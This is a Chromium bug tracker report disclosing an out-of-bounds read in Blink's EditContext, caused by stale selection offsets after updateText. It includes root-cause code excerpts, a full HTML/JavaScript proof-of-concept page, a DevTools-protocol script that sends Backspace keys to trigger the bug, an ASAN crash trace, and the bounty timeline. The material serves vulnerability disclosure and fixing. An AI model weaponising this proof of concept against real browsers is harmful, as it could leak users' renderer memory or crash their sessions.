# Out-of-Bounds Read in EditContext::DeleteCurrentSelection via Stale Selection Offsets

| Field | Value |
|-------|-------|
| **Issue ID** | [486202614](https://issues.chromium.org/issues/486202614) |
| **Status** | Verified |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>Editing>EditContext |
| **Reporter** | je...@gmail.com |
| **Assignee** | aj...@google.com |
| **Created** | 2026-02-21 |
| **Bounty** | $3,000.00 |

## Description

# Out-of-Bounds Read in EditContext::DeleteCurrentSelection via Stale Selection Offsets

## Summary

The EditContext API in Blink contains an out-of-bounds read vulnerability in the DeleteCurrentSelection function. When JavaScript calls updateText to shorten the internal text buffer, the selection offsets are not updated accordingly because the feature flag EditContextHandleTextOrSelectionUpdateDuringComposition is disabled by default. Subsequently, when a user triggers a delete operation such as pressing Backspace, the DeleteCurrentSelection function constructs StringView objects using the stale, out-of-bounds selection offsets. In release builds where SECURITY\_DCHECK is compiled out, this results in reading memory beyond the allocated string buffer, potentially leaking sensitive information or causing a renderer crash.

## Bisect

Introducing Commit: `6b63171c4d29c5bf23ecbf8f63a9aa0b3f2f42eb`

- Date: `Fri Jun 25 06:21:12 2021 +0000`
- Author: `Alex Keng <shihken@microsoft.com>`
- Review: `https://chromium-review.googlesource.com/c/chromium/src/+/2977992`

## Root Cause

The vulnerability stems from an incomplete synchronization between the text buffer and selection offsets in the EditContext implementation. The EditContext class maintains internal state including text\_ for the editable content and selection\_start\_ and selection\_end\_ for the current selection range. When updateText is called from JavaScript to modify the text content, the function updates text\_ but conditionally updates the selection offsets only when the RuntimeEnabledFeature EditContextHandleTextOrSelectionUpdateDuringComposition is enabled.

```
// third_party/blink/renderer/core/editing/ime/edit_context.cc:295-374
void EditContext::updateText(uint32_t start,
                             uint32_t end,
                             const String& new_text,
                             ExceptionState& exception_state) {
  // ... parameter validation ...

  text_ = StrCat({text_.Substring(0, start), new_text, text_.Substring(end)});

  if (RuntimeEnabledFeatures::
          EditContextHandleTextOrSelectionUpdateDuringCompositionEnabled()) {
    SetSelection(new_selection_start, new_selection_end);
  }
  // If the feature is disabled, selection offsets remain unchanged
  // even though text_ may now be shorter than the selection range
}

```

The feature flag EditContextHandleTextOrSelectionUpdateDuringComposition has status "test" in runtime\_enabled\_features.json5, meaning it is disabled in production builds. This creates a state where selection\_start\_ and selection\_end\_ can exceed text\_.length() after a call to updateText that shortens the text.

When a delete command is triggered, DeleteBackward is called. For non-collapsed selections where selection\_start\_ differs from selection\_end\_, the function directly invokes DeleteCurrentSelection without validating that the selection offsets are within bounds.

```
// third_party/blink/renderer/core/editing/ime/edit_context.cc:613-627
void EditContext::DeleteCurrentSelection() {
  if (selection_start_ == selection_end_)
    return;

  StringBuilder stringBuilder;
  stringBuilder.Append(StringView(text_, 0, OrderedSelectionStart()));
  stringBuilder.Append(StringView(text_, OrderedSelectionEnd()));
  text_ = stringBuilder.ToString();
  // ...
}

```

The function uses OrderedSelectionStart and OrderedSelectionEnd which simply return the minimum and maximum of the raw selection values without clamping to text\_.length().

```
// third_party/blink/renderer/core/editing/ime/edit_context.cc:502-508
uint32_t EditContext::OrderedSelectionStart() const {
  return std::min(selection_start_, selection_end_);
}

uint32_t EditContext::OrderedSelectionEnd() const {
  return std::max(selection_start_, selection_end_);
}

```

The StringView constructor calls Set which performs bounds checking only via SECURITY\_DCHECK.

```
// third_party/blink/renderer/platform/wtf/text/string_view.h:448-462
inline void StringView::Set(const StringImpl& impl,
                            unsigned offset,
                            unsigned length) {
  SECURITY_DCHECK(offset <= impl.length());
  SECURITY_DCHECK(length <= impl.length() - offset);
  length_ = length;
  impl_ = const_cast<StringImpl*>(&impl);
  UNSAFE_BUFFERS({
    if (impl.Is8Bit()) {
      bytes_ = impl.Characters8() + offset;
    } else {
      bytes_ = impl.Characters16() + offset;
    }
  });
}

```

The SECURITY\_DCHECK macro is defined to be a no-op in release builds without AddressSanitizer.

```
// third_party/blink/renderer/platform/wtf/assertions.h:50-71
#if defined(ADDRESS_SANITIZER) || DCHECK_IS_ON()
#define ENABLE_SECURITY_ASSERT 1
#else
#define ENABLE_SECURITY_ASSERT 0
#endif

#if ENABLE_SECURITY_ASSERT
#define SECURITY_DCHECK(condition) \
  LOG_IF(FATAL, !(condition)) << "Security DCHECK failed: " #condition ". "
#else
#define SECURITY_DCHECK(condition) ((void)0)
#endif

```

In production release builds, SECURITY\_DCHECK compiles to nothing, allowing the StringView to be constructed with an out-of-bounds length. When StringBuilder subsequently appends this StringView, it reads memory beyond the string buffer, constituting an out-of-bounds read vulnerability.

It should be noted that while UseBoundedSelectionOffsetsInEditContextDeleteOperations exists as a stable feature to clamp selection offsets, it only affects the BoundedSelectionStart and BoundedSelectionEnd functions which are used in the collapsed selection branch of DeleteBackward. The non-collapsed selection path through DeleteCurrentSelection still uses the unclamped OrderedSelectionStart and OrderedSelectionEnd functions.

## Reproduce

The following proof of concept demonstrates the vulnerability. Save the HTML file and open it in Chrome with an ASAN build, then the vulnerability will be triggered automatically via CDP keyboard input simulation. For testing in a release build, manual interaction by pressing the Backspace key after the page loads would trigger the out-of-bounds read.

```
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>EditContext DeleteCurrentSelection OOB Read PoC</title>
<style>
body { font-family: monospace; padding: 20px; }
#host {
    width: 400px;
    height: 100px;
    border: 2px solid #333;
    padding: 10px;
    background: #f0f0f0;
}
#host:focus { border-color: blue; outline: none; }
#log {
    margin-top: 20px;
    padding: 10px;
    background: #222;
    color: #0f0;
    height: 300px;
    overflow-y: auto;
    white-space: pre-wrap;
}
</style>
</head>
<body>
<h2>EditContext DeleteCurrentSelection OOB Read PoC</h2>
<p>This PoC demonstrates an OOB read in EditContext::DeleteCurrentSelection()</p>
<p><strong>Vulnerability:</strong> When updateText() shortens the text, selection offsets are not updated
(EditContextHandleTextOrSelectionUpdateDuringComposition is disabled by default).
DeleteCurrentSelection() then uses out-of-bounds selection offsets to construct StringView.</p>

<div id="host" tabindex="0">Click here and press Backspace to trigger</div>
<div id="log"></div>

<script>
const log = document.getElementById('log');
function logMsg(msg) {
    const timestamp = new Date().toISOString().substr(11, 12);
    log.textContent += `[${timestamp}] ${msg}\n`;
    log.scrollTop = log.scrollHeight;
    console.log(msg);
}

const host = document.getElementById('host');

if (typeof EditContext === 'undefined') {
    logMsg('ERROR: EditContext API not supported in this browser');
} else {
    logMsg('EditContext API is available');

    const initialTextLength = 1000;
    const initialText = 'A'.repeat(initialTextLength);
    const ec = new EditContext({ text: initialText });

    logMsg(`Created EditContext with text length: ${ec.text.length}`);

    host.editContext = ec;
    logMsg('EditContext attached to host element');

    ec.addEventListener('textupdate', (e) => {
        logMsg(`textupdate event: updateRangeStart=${e.updateRangeStart}, updateRangeEnd=${e.updateRangeEnd}`);
    });

    let vulnerabilityTriggered = false;

    host.addEventListener('focus', () => {
        logMsg('Host element focused');

        if (!vulnerabilityTriggered) {
            vulnerabilityTriggered = true;

            const selStart = 900;
            const selEnd = 950;
            ec.updateSelection(selStart, selEnd);
            logMsg(`updateSelection(${selStart}, ${selEnd}) - non-collapsed selection`);
            logMsg(`Current state: text.length=${ec.text.length}, selectionStart=${ec.selectionStart}, selectionEnd=${ec.selectionEnd}`);

            const deleteStart = 0;
            const deleteEnd = 800;
            ec.updateText(deleteStart, deleteEnd, '');

            logMsg(`updateText(${deleteStart}, ${deleteEnd}, '') - shortened text`);
            logMsg(`After updateText: text.length=${ec.text.length}`);
            logMsg(`Selection offsets (should be stale): selectionStart=${ec.selectionStart}, selectionEnd=${ec.selectionEnd}`);

            if (ec.selectionStart > ec.text.length || ec.selectionEnd > ec.text.length) {
                logMsg('WARNING: Selection offsets exceed text length!');
                logMsg(`  text.length = ${ec.text.length}`);
                logMsg(`  selectionStart = ${ec.selectionStart} (exceeds by ${ec.selectionStart - ec.text.length})`);
                logMsg(`  selectionEnd = ${ec.selectionEnd} (exceeds by ${ec.selectionEnd - ec.text.length})`);
                logMsg('');
                logMsg('NOW PRESS BACKSPACE to trigger DeleteCurrentSelection() with OOB offsets');
                logMsg('In ASAN build, this should trigger heap-buffer-overflow or SECURITY_DCHECK failure');
            } else {
                logMsg('Selection was properly clamped - vulnerability may be fixed or feature flag enabled');
            }
        }
    });

    host.addEventListener('beforeinput', (e) => {
        logMsg(`beforeinput: inputType=${e.inputType}`);
    });

    host.addEventListener('keydown', (e) => {
        logMsg(`keydown: key=${e.key}, code=${e.code}`);
        if (e.key === 'Backspace') {
            logMsg('Backspace pressed - DeleteBackward will be triggered');
            logMsg('If selection is non-collapsed, DeleteCurrentSelection() will be called');
            logMsg(`Current selection: ${ec.selectionStart}-${ec.selectionEnd}, text.length=${ec.text.length}`);
        }
    });

    setTimeout(() => {
        logMsg('Auto-focusing host element...');
        host.focus();
    }, 500);
}
</script>
</body>
</html>

```

To run this PoC with the ASAN build and automatically trigger the vulnerability using CDP, use the following command:

```
ASAN_OPTIONS=detect_odr_violation=0 timeout 50 xvfb-run -a bash -c '
    /path/to/chromium/src/out/asan-release/chrome \
        --no-sandbox \
        --disable-gpu-sandbox \
        --user-data-dir=/tmp/chrome_ec_test \
        --disable-background-networking \
        --disable-default-apps \
        --disable-extensions \
        --disable-sync \
        --no-first-run \
        --enable-logging=stderr \
        --remote-debugging-port=9225 \
        --remote-allow-origins="*" \
        "file:///path/to/poc_editcontext_oob.html" 2>&1 &

    CHROME_PID=$!
    sleep 12

    python3 -u << "PYEOF"
import json
import time
import urllib.request
import websocket

port = "9225"
resp = urllib.request.urlopen(f"http://127.0.0.1:{port}/json")
pages = json.loads(resp.read())
ws_url = pages[0]["webSocketDebuggerUrl"]

ws = websocket.create_connection(ws_url)
msg_id = 1

def send_cmd(method, params={}):
    global msg_id
    msg = {"id": msg_id, "method": method, "params": params}
    ws.send(json.dumps(msg))
    msg_id += 1
    return json.loads(ws.recv())

send_cmd("Runtime.enable")
send_cmd("DOM.enable")

send_cmd("Runtime.evaluate", {
    "expression": "document.getElementById(\"host\").focus();",
    "returnByValue": True
})

time.sleep(0.5)

for i in range(3):
    send_cmd("Input.dispatchKeyEvent", {
        "type": "keyDown",
        "key": "Backspace",
        "code": "Backspace",
        "windowsVirtualKeyCode": 8,
        "nativeVirtualKeyCode": 8,
        "text": ""
    })
    time.sleep(0.05)
    send_cmd("Input.dispatchKeyEvent", {
        "type": "keyUp",
        "key": "Backspace",
        "code": "Backspace",
        "windowsVirtualKeyCode": 8,
        "nativeVirtualKeyCode": 8
    })
    time.sleep(0.3)

time.sleep(2)
ws.close()
PYEOF

    sleep 5
    kill $CHROME_PID 2>/dev/null
    wait $CHROME_PID 2>/dev/null
'

```

The ASAN output demonstrates the vulnerability being triggered:

```
[1277168:1277168:0221/075649.958999:INFO:CONSOLE:43] "Host element focused", source: file:///home/user/chromium/src/poc_editcontext_oob.html (43)
[1277168:1277168:0221/075649.959890:INFO:CONSOLE:43] "updateSelection(900, 950) - non-collapsed selection", source: file:///home/user/chromium/src/poc_editcontext_oob.html (43)
[1277168:1277168:0221/075649.960785:INFO:CONSOLE:43] "Current state: text.length=1000, selectionStart=900, selectionEnd=950", source: file:///home/user/chromium/src/poc_editcontext_oob.html (43)
[1277168:1277168:0221/075649.961676:INFO:CONSOLE:43] "updateText(0, 800, '') - shortened text", source: file:///home/user/chromium/src/poc_editcontext_oob.html (43)
[1277168:1277168:0221/075649.962569:INFO:CONSOLE:43] "After updateText: text.length=200", source: file:///home/user/chromium/src/poc_editcontext_oob.html (43)
[1277168:1277168:0221/075649.963624:INFO:CONSOLE:43] "Selection offsets (should be stale): selectionStart=900, selectionEnd=950", source: file:///home/user/chromium/src/poc_editcontext_oob.html (43)
[1277168:1277168:0221/075649.964681:INFO:CONSOLE:43] "WARNING: Selection offsets exceed text length!", source: file:///home/user/chromium/src/poc_editcontext_oob.html (43)
[1277168:1277168:0221/075649.965598:INFO:CONSOLE:43] "  text.length = 200", source: file:///home/user/chromium/src/poc_editcontext_oob.html (43)
[1277168:1277168:0221/075649.966581:INFO:CONSOLE:43] "  selectionStart = 900 (exceeds by 700)", source: file:///home/user/chromium/src/poc_editcontext_oob.html (43)
[1277168:1277168:0221/075649.967625:INFO:CONSOLE:43] "  selectionEnd = 950 (exceeds by 750)", source: file:///home/user/chromium/src/poc_editcontext_oob.html (43)
[1277168:1277168:0221/075649.970026:INFO:CONSOLE:43] "NOW PRESS BACKSPACE to trigger DeleteCurrentSelection() with OOB offsets", source: file:///home/user/chromium/src/poc_editcontext_oob.html (43)
[1277168:1277168:0221/075656.717698:INFO:CONSOLE:43] "keydown: key=Backspace, code=Backspace", source: file:///home/user/chromium/src/poc_editcontext_oob.html (43)
[1277168:1277168:0221/075656.719825:INFO:CONSOLE:43] "Backspace pressed - DeleteBackward will be triggered", source: file:///home/user/chromium/src/poc_editcontext_oob.html (43)
[1277168:1277168:0221/075656.721439:INFO:CONSOLE:43] "If selection is non-collapsed, DeleteCurrentSelection() will be called", source: file:///home/user/chromium/src/poc_editcontext_oob.html (43)
[1277168:1277168:0221/075656.725503:INFO:CONSOLE:43] "Current selection: 900-950, text.length=200", source: file:///home/user/chromium/src/poc_editcontext_oob.html (43)
[1277168:1277168:0221/075656.728736:INFO:CONSOLE:43] "beforeinput: inputType=deleteContentBackward", source: file:///home/user/chromium/src/poc_editcontext_oob.html (43)
[1277345:1277345:0221/075656.728851:FATAL:third_party/blink/renderer/platform/wtf/text/string_view.h:452] Security DCHECK failed: length <= impl.length() - offset.
#0 0x557a80772006 (/home/user/chromium/src/out/asan-release/chrome+0x6791005)
#1 0x7f9635f5eb72 (/home/user/chromium/src/out/asan-release/libbase.so+0x75eb71)
#2 0x7f9635f043e3 (/home/user/chromium/src/out/asan-release/libbase.so+0x7043e2)
#3 0x7f9635bcf5d7 (/home/user/chromium/src/out/asan-release/libbase.so+0x3cf5d6)
#4 0x7f9635bd0e69 (/home/user/chromium/src/out/asan-release/libbase.so+0x3d0e68)
#5 0x7f95e33e29a4 (/home/user/chromium/src/out/asan-release/libblink_core.so+0x3be29a3)
#6 0x7f95e329d528 (/home/user/chromium/src/out/asan-release/libblink_core.so+0x3a9d527)
#7 0x7f95e329f1da (/home/user/chromium/src/out/asan-release/libblink_core.so+0x3a9f1d9)
#8 0x7f95e3377035 (/home/user/chromium/src/out/asan-release/libblink_core.so+0x3b77034)
#9 0x7f95e33778c3 (/home/user/chromium/src/out/asan-release/libblink_core.so+0x3b778c2)
#10 0x7f95e4246636 (/home/user/chromium/src/out/asan-release/libblink_core.so+0x4a46635)
#11 0x7f95e62deb59 (/home/user/chromium/src/out/asan-release/libblink_core.so+0x6adeb58)
#12 0x7f95e639e082 (/home/user/chromium/src/out/asan-release/libblink_core.so+0x6b9e081)
#13 0x7f95e639bc3a (/home/user/chromium/src/out/asan-release/libblink_core.so+0x6b9bc39)
#14 0x7f95e639a1f8 (/home/user/chromium/src/out/asan-release/libblink_core.so+0x6b9a1f7)
#15 0x7f95e424546c (/home/user/chromium/src/out/asan-release/libblink_core.so+0x4a4546b)
#16 0x7f95e3af4093 (/home/user/chromium/src/out/asan-release/libblink_core.so+0x42f4092)
#17 0x7f95e42936b7 (/home/user/chromium/src/out/asan-release/libblink_core.so+0x4a936b6)
#18 0x7f95e3b0e915 (/home/user/chromium/src/out/asan-release/libblink_core.so+0x430e914)
#19 0x7f95db03ca81 (/home/user/chromium/src/out/asan-release/libblink_platform.so+0x263ca80)
#20 0x7f95db054f8d (/home/user/chromium/src/out/asan-release/libblink_platform.so+0x2654f8c)
#21 0x7f95db0551fd (/home/user/chromium/src/out/asan-release/libblink_platform.so+0x26551fc)
#22 0x7f95db01e415 (/home/user/chromium/src/out/asan-release/libblink_platform.so+0x261e414)
#23 0x7f95db022018 (/home/user/chromium/src/out/asan-release/libblink_platform.so+0x2622017)
#24 0x7f95db01c3e5 (/home/user/chromium/src/out/asan-release/libblink_platform.so+0x261c3e4)
#25 0x7f95db02854d (/home/user/chromium/src/out/asan-release/libblink_platform.so+0x262854c)
#26 0x7f9635d60c83 (/home/user/chromium/src/out/asan-release/libbase.so+0x560c82)
#27 0x7f9635de216f (/home/user/chromium/src/out/asan-release/libbase.so+0x5e216e)
#28 0x7f9635de1147 (/home/user/chromium/src/out/asan-release/libbase.so+0x5e1146)
#29 0x7f9635c033f2 (/home/user/chromium/src/out/asan-release/libbase.so+0x4033f1)
#30 0x7f9635de37e9 (/home/user/chromium/src/out/asan-release/libbase.so+0x5e37e8)
#31 0x7f9635ccb003 (/home/user/chromium/src/out/asan-release/libbase.so+0x4cb002)
#32 0x7f962b9ff0a6 (/home/user/chromium/src/out/asan-release/libcontent.so+0x79ff0a5)
#33 0x7f962be316e8 (/home/user/chromium/src/out/asan-release/libcontent.so+0x7e316e7)
#34 0x7f962be328af (/home/user/chromium/src/out/asan-release/libcontent.so+0x7e328ae)
#35 0x7f962be34e0b (/home/user/chromium/src/out/asan-release/libcontent.so+0x7e34e0a)
#36 0x7f962be2f594 (/home/user/chromium/src/out/asan-release/libcontent.so+0x7e2f593)
#37 0x7f962be2f91b (/home/user/chromium/src/out/asan-release/libcontent.so+0x7e2f91a)
#38 0x557a808079f6 (/home/user/chromium/src/out/asan-release/chrome+0x68269f5)
#39 0x7f95c5629d90 (/usr/lib/x86_64-linux-gnu/libc.so.6+0x29d8f)
#40 0x7f95c5629e40 (/usr/lib/x86_64-linux-gnu/libc.so.6+0x29e3f)
#41 0x557a8072a4aa (/home/user/chromium/src/out/asan-release/chrome+0x67494a9)

```

The ASAN output confirms that the SECURITY\_DCHECK at string\_view.h:452 detected the bounds violation with the condition "length <= impl.length() - offset" failing. The selection offsets of 900 and 950 far exceed the text length of 200, causing an attempted out-of-bounds read of 700 to 750 bytes beyond the string buffer.

## Credit

Please use c6eed09fc8b174b0f3eebedcceb1e792 as the credit for this vulnerability. Thank you.

## Timeline

### cl...@appspot.gserviceaccount.com (2026-02-23)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6154063150252032.

### 24...@project.gserviceaccount.com (2026-02-23)

Testcase 6154063150252032 failed to reproduce the crash. Please inspect the program output at https://clusterfuzz.com/testcase?key=6154063150252032.

### je...@gmail.com (2026-02-27)

Hi, my issue ID seems to be earlier. Could you explain why that report wasn’t marked as a duplicate of mine instead?

### ch...@google.com (2026-05-15)

Dear owner, thanks for fixing this bug. We've reopened it because:

- Some CLs listed in the “Fixed By Code Changes” field are invalid and have been removed. Please provide an appropriate Gerrit url that matches the pattern: `https://<host>-review.googlesource.com/c/<repo>/+/<change_number>` or use the value 'NA' and re-mark this bug as fixed. If this field requires human intervention for some reason, please add this bug to the hotlist id 6265590.After resolving the above issue(s), this bug can be marked closed again. Thanks for your time!

### aj...@google.com (2026-05-15)

shush robot

### sp...@google.com (2026-06-15)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $3000.00 for this report.

Rationale for this decision:
Baseline. User information disclosure with bisect.


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### ch...@google.com (2026-08-22)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/486202614)*
